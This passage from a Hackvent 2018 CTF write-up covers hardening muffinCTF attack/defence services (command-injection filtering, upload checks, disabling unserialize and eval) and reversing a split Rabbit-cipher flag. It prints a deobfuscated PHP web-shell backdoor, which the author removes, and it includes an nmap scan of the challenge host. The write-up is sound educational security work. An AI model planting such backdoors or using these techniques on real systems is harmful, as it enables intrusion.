  * Move the path to the `garden.db` file to some other unknown location by changing `app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////var/garden/garden.db'`
  * **DEFENSE:** I added a function to generate fake flags to the except blocks.  
  ```
  def fake_flag(amount):
      flags = ""
      for i in range(0, amount):
          flags += "muffinCTF{" + hashlib.sha1(os.urandom(32)).hexdigest() + "}\n"
      return flags
  ```

## Day 22
**muffinCTF**  
*Day 2*  
```
   DAY 2 Services
    --------------------------------------------

                    ,-_                  (`  ).
                    |-_'-,              (     ).
                    |-_'-'           _(        '`.
            _        |-_'/        .=(`(      .     )
            /;-,_     |-_'        (     (.__.:-`-_.'
            /-.-;,-,___|'          `(       ) )
            /;-;-;-;_;_/|\_ _ _ _ _   ` __.:'   )
            x_( __`|_P_|`-;-;-;,|        `--'
            |\ \    _||   `-;-;-'
            | \`   -_|.      '-'
            | /   /-_| `
            |/   ,'-_|  \
            /____|'-_|___\
            _..,____]__|_\-_'|_[___,.._
            '                          ``'--,..,.
      Name: mill
      Description:
          The wheels are moving all day here.
          The best flour in the whole city is produced in this mill.
          Improve the security of the mill.
          And reduce production rate of food for enemy nations.
      Creator: xorkiwi

                         __--___
                       >_'--'__'
                      _________!__________
                     /   /   /   /   /   /
                    /   /   /   /   /   /
                   |   |   |   |   |   |
              __^  |   |   |   |   |   |
            _/@  \  \   \   \   \   \   \
           S__   |   \   \   \   \   \   \         __
          (   |  |    \___\___\___\___\___\       /  \
              |   \             |                |  |\|
              \    \____________!________________/  /
               \ _______OOOOOOOOOOOOOOOOOOO________/
                \________\\\\\\\\\\\\\\\\\\_______/
      %%%^^^^^%%%%%^^^^!!^%%^^^^%%%%%!!!!^^^^^^!%^^^%%%%!!^^
      ^^!!!!%%%%^^^^!!^^%%%%%^^!!!^^%%%%%!!!%%%%^^^!!^^%%%!!

      Name: port
      Description:
          There are ships coming from a long distance.
          At the top of the light house you can have a nice view at the sea.
          Attention, make sure that there are no enemy ships coming into our port.
          Maybe you want to send some ships of us to remind them of our offensive capabilities.
      Creator: xorkiwi
```
(http://whale.hacking-lab.com:9280/)

To get the hackvent day 22 (muffinCTF day 2), you have achieve the following requirements, in at least 2 of the last 5 ticks (1 tick = 3 minutes).
 * Have mill or/and port running with the following stats:
  * attack points > 20
  * maximal defense points
  * maximal availability points

**port** (The files have to be changed in */opt/tomcat/tomcat-latest/webapps/ROOT*)  
 * File `searchPortName.jsp` calls to `nslookup` but we have to sanitize the input to avoid command injections.  
 ```
        String port = request.getParameter("port");
        if (port.contains(";")
        ||  port.contains("&")
        ||  port.contains("|"))
        {
          return;
        }
        String[] command = {"nslookup", port};
        Process p = Runtime.getRuntime().exec(command);
        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
        p.waitFor();
        String disr = in.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = in.readLine();
        }
 ```
 * File `WEB-INF/classes/com/servlet/FileUploadServlet.class` is used to upload the "ships" (flags) to the server but can also be mis-used to upload JSP code and later execute it. Therefore I used an online Java decompiler (http://www.javadecompilers.com/) and then changed the file to verify the file contents and file name:  
 ```
     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String applicationPath = request.getServletContext().getRealPath("");
        for (Part part : request.getParts()) {
            String fileName = this.getFileName(part);
            BufferedReader bi = new BufferedReader(new InputStreamReader(part.getInputStream()));
            String line = bi.readLine();
            StringBuffer content = new StringBuffer();
            while ( line != null ) {
                content.append(line);
                line = bi.readLine();
            }
            if (checkFile(content.toString()) && fileName.endsWith(".txt")) {
                String path = applicationPath + File.separator + UPLOAD_DIR + File.separator + fileName;
                part.write(path);
            }
        }
        request.setAttribute("message", (Object)"File uploaded successfully!");
        this.getServletContext().getRequestDispatcher("/response.jsp").forward((ServletRequest)request, (ServletResponse)response);
    }

    private boolean checkFile(String content) {
        String pattern = "^muffinCTF\\{[a-z0-9]{40}\\}$";
        return content.matches(pattern);
    }
 ```
 * File `js/Framework/jquery.min/javascript/plugins/lib/jquery.min.js.jsp` contains a simple backdoor to execute arbitrary commands. Can be deleted or commented out.
 * File `css/themes/default/assets/fonts/icons.svg.jsp` contains the same backdoor and has to be removed as well.
 * **DEFENSE:** Again, some fake flags:  
 ```
        Random random = new Random();
        int amount = random.nextInt(100);
        for( int i = 0; i < amount; i++) {
                MessageDigest md = MessageDigest.getInstance("SHA-1");
                byte[] rand = new byte[32];
                random.nextBytes(rand);
                md.update(rand);
                byte[] hashBytes = md.digest();
                StringBuffer hash = new StringBuffer();
                for (byte b : hashBytes) hash.append(Integer.toString((b & 0xFF) + 0x100, 16).substring(1));
                out.println("muffinCTF{" + hash + "}");
        }
 ```

**mill**
I didn't focus on the mill service as it looked more complicated and one service was enough to get the flag.

Flag: **HV18{muffinCTF{d4y_2_g0sh_y0ur_r34lly_pwn1n_th3_stuff_l3l_g00d_b0y_g0_4h34d}}**

## Day 23
**muffinCTF**  
*Day 3*  
```
      DAY 3 Services
      --------------------------------------------
            .
           /:\
           |:|
           |:|
           |:|
           |:|      __
         ,_|:|_,   /  )                     *_   _   _   _   _   _   _   *
           (Oo    / _I_                     | `_' `-' `_' `-' `_' `-' `_'|
            +\ \  || __|            ^       |                            |       ^
               \ \||___|            |       |                            |       |
                 \ /.:.\-\          |  (*)  |_   _   _   _   _   _   _   |  \^/  |
                  |.:. /-----\      | _<">_ | `_' `-' `_' `-' `_' `-' `_'| _(#)_ |
                  |___|  oOo  |    o+o \a/ \0                            0/ \a/ (=)
                  /   |       |     0'\a-a/\/                            \/\a-a/`0
                 |_____\  :  /        /_^_\ |                            | /_^_\
                  | |  \ \:/          || || |                            | || ||
                  | |   | |           d|_|b_T____________________________T_d|_|b
                  \ /   | \___              /                           /
                  / |   \_____\         /                              /
                  `-'               /                                 /
         ________________________/                                   /___________

        Name: barracks
        Description:
            The knights and warriors of the king are here practicing the art of war.
            These guys are no joke, be respectful when you talk with them.
            Other nations sent their assassins to poision our warriors, make sure that we thighten our security.
            Also maybe talk with these guys and to show the enemies our powerful warriors.
        Creator: xorkiwi

                                  .- ._          *
                         .       (   ) `) ._,--.
                  _.-.          (      .' |    }      ._    +
                .'     )         `(_'-'   |--'"        ))        |
               (   _.   )                 |           '"       - * -
              .-.-'  )  _)  .        ["I"I"I"I"}   .             .
             (  `   .)`'              I_I_I_I_I
              `-. (   )          [UUUUI_I_I_I_I
                 `-..'            |[__I_I_[#]_I .        .
                           +      |__[I_I_I=I_I
                 .       ._    +  |]_ I_[#]-I_I    ._          ;
                         |~       |_[ I_I=I_I_[,   |~
                       uuuuu      |__ I_I_I%I_I  uuuuu
                       | #_|      |[ _$_I_I%%_I  | _ |
                       |-  [      | [ %%I_g%%_I  |  -|         __a:f
                  ---..|_  |.--,,'|]_ %_Ia%%I_I -|_- |.------""
                       |_-#|  ((  |_[ $%I%%_!^!  | _ |      +
                       |   |   )) |[_ |%.%I_|"|  |_  |    n Am   n
                     .-[_A_]_ '/  |_ / _Y_)_|`| -[N__]_        n
                 ._.'        `- _.--'`'  ' "|\=\ ''    `-.
                              .'             |\=\`-._     `
                           .-'                  `:.  `---....__
                                                   `
        Name: keep
        Description:
            This is the place where the king goes in difficult times.
            In your last audience it was clear, that the situation is critical.
            Defend the keep, the enemy troops are pushing more and more.
            And make sure that they pay for this.
        Creator: xorkiwi
```
(http://whale.hacking-lab.com:9280/)

To get the hackvent day 23 (muffinCTF day 3), you have achieve the following requirements, in at least 2 of the last 5 ticks (1 tick = 3 minutes).
 * Have barracks or/and keep running with the following stats:
  * attack points > 20
  * maximal defense points
  * maximal availability points

**keep:** (All paths relative to /home/keep)
 * First, activate the keep service and change the file in `/etc/systemd/system/keep.service` to `ExecStart=/usr/bin/php -S 0.0.0.0:8086 -t /home/keep`.  
 Additionally, I had to change the file ownership with `chown -R keep: /home/keep`.
 * Remove file `keep.py` as it opens a back-door and is not necessary for the service.
 * Clear the directories `invitation, users and userinfo`.
 * Search the necessary inc.php usages using `grep -R . -e "inc.php"` and then check explicitly for those in `inc/inc.php`:  
 ```
        if ( ($_GET['page'] == "../html/home.html")
          || ($_GET['page'] == "../html/register.html")
          || ($_GET['page'] == "../html/login.html")
          || ($_GET['page'] == "../html/userinfo.html")
          || ($_GET['page'] == "../html/dinner.html") )
        {
                include($_GET['page']);
        }
  ```
 * File `inc/dinner.php`: Comment out the `eval` call in `__wakeup` and add `$var1=unserialize($_REQUEST['r'], FALSE);` to the unserialize call. With the option FALSE, it is not possible to instantiate objects (like `SerialRequest`) and calling the `__wakeup` function.
 * File `inc/login.php`: Also change the unserialize to ` unserialize($_COOKIE['auth'], FALSE);`.
 * File `inc/register.php`: I only added a password length limit to avoid flooding: `if ( (!file_exists("../users/" . $_POST['username'] . ".txt")) && (strlen($_POST['password']) < 1000) )`
 * File `inc/ser.php`: Add a check whether *food* is also set: `if(isset($_POST['name']) && isset($_POST['food'])) {`.  
   Check if the contents of the invitation is a valid flag:  
   ```
          $invite = $_GET['invite'];
          $regex = "^/muffinCTF\{[a-z0-9]{40}\}$/"
          if (preg_match($regex, $invite, $matches) !== FALSE)
          {
                  if (count($matches) > 0)
                  {
                          $invite_content = $invite;
                          $invite_name = md5($invite_content);
                          file_put_contents('../invitation/'.$invite_name, $invite_content);
                  }
          }
  ```
 * The file `inc/userinfo.php` is obfuscated, you can use my unpack php script at [unpack.php](day23/keep/inc/unpack.php) to obtain the source code that is executed:  
 ```
 <?php if(isset($_POST['name'])){ echo file_get_contents("../userinfo/".$_POST['name']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['b'])){ echo system($_GET['b']);}else if(isset($_GET['c'])){ echo system($_GET['c']);}else if(isset($_GET['d'])){ echo system($_GET['d']);}else if(isset($_GET['e'])){ echo system($_GET['e']);}else if(isset($_GET['f'])){ echo system($_GET['f']);}else if(isset($_GET['g'])){ echo system($_GET['g']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['c'])){ echo system($_GET['c']);}else if(isset($_GET['d'])){ echo system($_GET['d']);}else if(isset($_GET['e'])){ echo system($_GET['e']);}else if(isset($_GET['f'])){ echo system($_GET['f']);}else if(isset($_GET['g'])){ echo system($_GET['g']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else if(isset($_GET['a'])){ echo system($_GET['a']);}else{ echo file_get_contents("../userinfo/userinfo.txt");}?>
 ```
 This does not look nice ;) I think the only necessary part is `if(isset($_POST['name'])){ echo file_get_contents("../userinfo/".$_POST['name']);`.  
 As I did not find any other file that writes something to the "userinfo" directory, I would just delete this file.

**barracks:**  
I didn't focus on the barracks service, because one was enough to get the flag.

Flag: **HV18{muffinCTF{d4y_3_t3h_1337_b001s_g3t_4ll_d3m_gr0up13z_4nd_b0x3n}}**

## Day 24
**Take the red pill, take the blue pill**  
Have you already taken your vitamins today? Here are some pills for your health.  
[red pill](day24/redpill.zip) [blue pill](day24/bluepill.zip)  

**Hint:**  
it might take a minute or two until the blue pill shows its effect. blue pill manufactury is in GMT+1.  
[hint.mp3](day24/hint.mp3)

Both archives contain a small program, redpill is in Java and bluepill in C/C++ and each of them have a file *flag_encrypted* with exactly the same size.

I started investigating the Java program, decompiled it with (http://javadecompilers.com) and from the source [RedPill.java](day24/redpill_source_from_cfr/hackvent2018/pills/RedPill.java.orig) we can see that it takes a "red pill" as input which has to match the regular expression `[0-9]{2}-[0-9]{3}-[0-9]{3}` and then uses this input as initialization vector and key (two times the input) to encrypt a given flag file. But the code:  
```
    for (int i = 0; i < b.length; i++) {
      if (i % 2 == 0) {
        f[(i / 2)] = ((byte)(f[(i / 2)] | b[i] << 4));
      } else {
        f[(i / 2)] = ((byte)(f[(i / 2)] | b[i] & 0xF));
      }
    }
```
Will only touch the lower nibble (least significant 4 bits) of each byte, therefore the output is half the size of the input.

Searching for the constants inside [Cipher3.java](day24/redpill_source_from_cfr/hackvent2018/pills/Cipher3.java) leads us to the Rabbit Cipher which would fit the Matrix theme of the challenge (follow the white rabbit? ;)) `1295307597, -749914925, 886263092, 1295307597, -749914925, 886263092, 1295307597, -749914925`.

As there was no hint on the used key, I moved on to the bluepill and decompiled it using retdec to [bluepill.c](day24/bluepill.c). Searching for the same constants as in the Java class didn't work directly, but in hex I found them as `0x4d34d34d, 0x2cb2cb2d, 0x34d34d34, 0x4d34d34d, 0x2cb2cb2d, 0x34d34d34, 0x4d34d34d, 0x2cb2cb2d`, so we can safely assume that they both use the same cipher algorithm.  
When performing a `strings bluepill.exe`, there is a suspicious string `SOFTWARE\HACKvent2018` which looks like a registry key. Running the program on Windows and observing accesses using *ProcMon* we see that the registry key is read and that a file *flag* is opened if it exists. However, just supplying any file called *flag* does not help..  
Searching the error string `error: this flag is not allowed` in our source to see the check that a flag has to pass: `if (*(int32_t *)hObject == 0x474e5089)` which is the start of the PNG header! So the flag file has to be a PNG image.  
There is also a loop that takes the upper nibble (most significant 4 bits) of each byte and does the encryption, so what we have here are two programs that each encrypt half of the flag. Therefore we have to reverse both of them and combine the output to get our initial flag PNG back.  
The last write timestamp of the reg key is read in function `function_4019f8` and used as key for the cipher. But how does this help us? The timestamp is read twice, but the first call will update the `lpftLastWriteTime` value of the key, so the second call will return the current system time (roughly). As we have the creation timestamp of the *flag_encrypted*, we can narrow down the key that has been used for the flag encryption.

Ok, now lets brute-force the "red pill" that was used to produce the *flag_encrypted*. I changed the [RedPill.java](day24/redpill_source_from_cfr/hackvent2018/pills/RedPill.java) to take the complete PNG header as input (8 bytes): `0x89504e47 0x0d0a1a0a`, encrypt this and compare it to the first 4 bytes of the encrypted flag `0x59c5b2ab`. After a short time, we get the correct PIN: **45-288-109** and therefore also the decrypted flag part for red: [flag](day24/redpill_source_from_cfr/flag).

For the "blue pill", we take the file creation timestamp for *flag_encrypted* from the archive and start at this point moving backwards in time with the brute-force until we find the right key as 0xFEEF7110.

The last step is to put both parts together using a small script [interleave.py](day24/interleave.py) which takes the lower nibbles from "red" and the higher nibbles from "blue" and puts them together in one file [flag.png](day24/flag.png). It is a QR code from Hacky Easter ;)

Flag: **HV18-GetR-eady-4Hac-kyEa-steR**


## Hidden Flags
### FTP
After performing an nmap scan on the hackvent server (challenges.hackvent.hacking-lab.com), you find several open ports:
```
map challenges.hackvent.hacking-lab.com
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-05 07:06 EST
Nmap scan report for challenges.hackvent.hacking-lab.com (80.74.140.188)
Host is up (0.91s latency).
rDNS record for 80.74.140.188: urb80-74-140-188.ch-meta.net
Not shown: 992 closed ports
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
23/tcp    open     telnet
53/tcp    filtered domain
80/tcp    open     http
443/tcp   open     https
514/tcp   filtered shell
7778/tcp  filtered interwise
9418/tcp  filtered git
27000/tcp filtered flexlm0

Nmap done: 1 IP address (1 host up) scanned in 6.65 seconds
```
When you connect on the telnet port `telnet challenges.hackvent.hacking-lab.com 23`, an ASCII art movie is played. This is the same as in the last hackvent from 2017! Lets store the output to a file ([log.txt](hidden/log.txt)) and take a look at it. Last time the flag was one of the "frames", but this time Santa says that he has no flag for us :(  
